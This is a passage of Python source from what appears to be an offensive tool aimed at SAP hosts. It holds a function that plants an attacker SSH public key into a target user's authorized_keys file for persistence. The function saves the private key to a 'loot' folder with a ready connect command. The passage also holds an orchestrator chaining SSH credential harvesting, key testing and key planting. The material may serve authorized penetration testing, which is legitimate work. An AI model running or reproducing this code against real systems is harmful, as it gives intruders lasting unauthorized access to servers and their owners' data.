        f'chmod 700 "{target_home}/.ssh" && '
        f'echo "{SAPMAP_SSH_PUBKEY}" >> '
        f'"{target_home}/.ssh/authorized_keys" && '
        f'chmod 600 "{target_home}/.ssh/authorized_keys" && '
        f'echo PLANT_OK'
    )
    out = exec_fn(plant_cmd)

    if "PLANT_OK" not in out:
        result["error"] = (
            f"authorized_keys write failed for {target_user} "
            f"at {target_home}/.ssh/authorized_keys")
        return result

    print(f"[+] {sid}: ssh_plant_key — pubkey planted into "
          f"{target_home}/.ssh/authorized_keys")

    # Save private key to loot for the operator
    host_id = (node.ip or node.hostname or sid).replace("/", "_")
    loot_dir = os.path.join("loot", "ssh", host_id)
    os.makedirs(loot_dir, exist_ok=True)
    priv_path = os.path.join(loot_dir, "sapmap_ed25519")
    with open(priv_path, "w") as fh:
        fh.write(SAPMAP_SSH_PRIVKEY)
    os.chmod(priv_path, 0o600)
    pub_path = os.path.join(loot_dir, "sapmap_ed25519.pub")
    with open(pub_path, "w") as fh:
        fh.write(SAPMAP_SSH_PUBKEY + "\n")

    emit_finding(
        "CRITICAL", sid,
        f"SSH authorized_keys persistence: SAPMAP ed25519 pubkey "
        f"planted into {target_user}@{sid} "
        f"({target_home}/.ssh/authorized_keys). "
        f"Private key saved to {priv_path}. "
        f"Connect: ssh -i {priv_path} {target_user}@"
        f"{node.ip or node.hostname}",
        ref="ssh.persist.key_planted",
        attack_capability="persist.ssh_key_plant",
        meta={"target_user": target_user,
              "target_home": target_home,
              "priv_key_path": priv_path,
              "pubkey": SAPMAP_SSH_PUBKEY})

    result["ok"] = True
    return result


# ---------------------------------------------------------------------------
# Combined orchestrator — all three phases in sequence
# ---------------------------------------------------------------------------

def ssh_full_chain(node: SAPNode, state: SAPMAPState,
                   channel: str = "auto",
                   plant: bool = False) -> dict:
    """Run harvest → test keys → optionally plant.

    Returns combined result dict.
    """
    combined = {"phase1": None, "phase2": None, "phase3": None}

    p1 = ssh_harvest(node, state, channel=channel)
    combined["phase1"] = p1
    if not p1.get("ok"):
        return combined

    p2 = ssh_test_keys(node, state, harvest_result=p1, channel=channel)
    combined["phase2"] = p2

    if plant:
        p3 = ssh_plant_key(node, state, channel=channel)
        combined["phase3"] = p3

    return combined
